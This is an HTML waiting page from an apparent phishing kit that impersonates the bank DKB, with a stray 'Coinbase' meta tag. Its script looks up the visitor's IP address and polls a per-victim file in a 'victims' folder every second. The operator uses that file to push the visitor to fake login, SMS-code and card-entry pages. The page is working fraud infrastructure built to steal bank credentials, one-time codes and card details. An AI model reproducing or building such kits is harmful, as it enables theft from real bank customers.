<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>DKB</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
    </head>
    <body class="form_box">
      
    <div class="loading d-flex justify-content-center align-items-center flex-column" style="width:100%; height:100vh;">
        <img src="./Asstes/imgs/logo2.svg" alt="">
        <div class="spinner-border text-warning" role="status" style="border-color: #148DEA;
        border-right-color: #dadada; width: 2.0em;  height: 2.0em; margin-top: -23px;">
          <span class="sr-only">Loading...</span>
        </div>
    </div>








    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
  <script>
        async function getClientIP() {
            try {
                // Fetch IP from a public API
                let response = await fetch('https://api.ipify.org?format=json');
                let data = await response.json();
                let ip = data.ip;
                
                console.log("Client IP:", ip);

                // Store or use the IP in your logic
                checkStatus(ip);
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        function checkStatus(ip) {
            var waiting = setInterval(function() {
                // Adjust the URL to match your server's setup
                fetch('victims/' + ip + '.txt')
                    .then(response => response.text())
                    .then(data => {
                        if (data == 0) {
                            // Do nothing or add more logic if needed
                        } else if (data == 'log') {
                            clearInterval(waiting);
                            window.location.href = "login.php";
                        } else if (data == 'log_error') {
                            clearInterval(waiting);
                            window.location.href = "login.php?error";
                        } else if (data == 'sms') {
                            clearInterval(waiting);
                            window.location.href = "sms.php";
                        } else if (data == 'sms_error') {
                            clearInterval(waiting);
                            window.location.href = "sms.php?error";
                        } else if (data == 'card') {
                            clearInterval(waiting);
                            window.location.href = "card.php";
                        } else if (data == 'card_error') {
                            clearInterval(waiting);
                            window.location.href = "card.php?error";
                        } else if (data == 'success') {
                            clearInterval(waiting);
                            window.location.href = "success.php";
                        }
                    })
                    .catch(error => console.error('Error checking status:', error));
            }, 1000);
        }

        // Run the IP fetch on page load
        window.onload = getClientIP;
    </script>
 
 </body>
</html>